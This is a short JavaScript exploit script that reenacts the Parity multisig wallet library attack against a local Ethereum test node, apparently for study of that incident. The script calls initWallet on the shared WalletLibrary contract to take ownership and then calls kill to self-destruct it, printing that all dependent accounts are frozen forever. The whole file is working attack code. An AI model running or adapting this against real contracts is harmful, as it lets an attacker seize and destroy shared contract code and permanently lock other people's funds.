let Web3 = require('web3');
let contract = require("truffle-contract");

let provider = new Web3.providers.HttpProvider("http://localhost:8545");
let web3 = new Web3(provider);

let walletAbi = require('./build/contracts/Wallet.json');
let walletLibraryABI = require('./build/contracts/WalletLibrary.json');
var WalletLibrary = contract(walletLibraryABI); 
var Wallet = contract(walletAbi); 
WalletLibrary.setProvider(provider);
Wallet.setProvider(provider);

//Original HACK2:
var library;
// get the library
WalletLibrary.deployed()
.then((lib) => {
    // assign ownership in similar fashion to hack1, except we don't need amount
    library = lib;
    return lib.initWallet([], 0, 0, {from: web3.eth.accounts[0], gas: 500000});
})
.then((tx) => {
    // deliver killing blow
    return library.kill(web3.eth.accounts[0], {from: web3.eth.accounts[0], gas: 500000});
})
.then((tx) => {
    console.log('The base library is dead! All accounts are now frozen forever...');
    console.log('Library Code: ' + web3.eth.getCode(library.address));            
});
// more explanation: https://medium.com/chain-cloud-company-blog/parity-multisig-hack-again-b46771eaa838